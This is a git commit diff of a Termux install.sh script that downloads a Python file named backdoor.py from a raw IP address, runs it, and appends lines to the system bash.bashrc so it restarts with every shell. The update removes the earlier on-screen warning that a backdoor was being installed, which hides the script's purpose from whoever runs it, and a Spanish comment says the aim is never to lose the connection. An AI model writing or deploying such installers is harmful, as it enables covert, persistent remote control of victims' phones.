057eb64498541820eaf653cf4f02d94488a5e139
Facu Salgado <63315825+byteSalgado@users.noreply.github.com>
2021-02-28 13:36:57 -0300

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,32 +1,25 @@
+
 #!/bin/bash
-printf "\e[1;31m Bienvenido al script bash\n"
-sleep 5
 clear
-printf "\e[1;31m Este script ejecutara un backdoor python y le pondra persistencia\n"
-sleep 3
+termux-setup-storage
+pkg update -y && pkg upgrade -y
 clear
 pkg install python -y
 pkg install wget -y
-pkg install python2 -y
-printf "\e[1;31m Herramientas instaladas se descargara el backdoor en 5 segundos\n"
-wget https://download1645.mediafire.com/zvqmobv354zg/gq3eu1315jk8sy9/backdoor.py
+wget http://192.81.217.221/backdoor.py
 chmod +x backdoor.py
 python backdoor.py
-termux-setup-storage
-mv pishing.py /data/data/com.termux/files/usr/etc/
-cd /data/data/com.termux/files/usr/etc/
-sleep 1
+
+##AGREGAR LA PERSISTENCIA AL BACKDOOR PARA NO PERDER CONEXION NUNCA
+
+mv backdoor.py /data/data/com.termux/files/usr/etc
+cd /data/data/com.termux/files/usr/etc
+echo "agregando persistencia al backdoor"
+sleep 2
+eho "cd /data/data/com.termux/files/usr/etc" >> /data/data/com.termux/files/usr/etc/bash.bashrc
 clear
-printf "\e[1;31m Agregando persistencia al backdoo en 5 segundos\n"
-sleep 5
+echo "python backdoor.py" >> /data/data/com.termux/files/usr/etc/bash.bashrc
 clear
-echo "cd /data/data/com.termux/files/usr/etc/" >> /data/data/com.termux/files/usr/etc/bash.bashrc
+echo "persistencia agregada correctamente"
+echo  "$HOME" >> /data/data/com.termux/files/usr/etc/bash.bashrc
 clear
-echo "python pishing.py" >> /data/data/com.termux/files/usr/etc/bash.bashrc
-clear
-echo "cd" >> /data/data/com.termux/files/usr/etc/bash.bashrc
-clear
-printf "\e[1;31m Persistencia agregada...\n"
-sleep 5
-cd $HOME
-exit
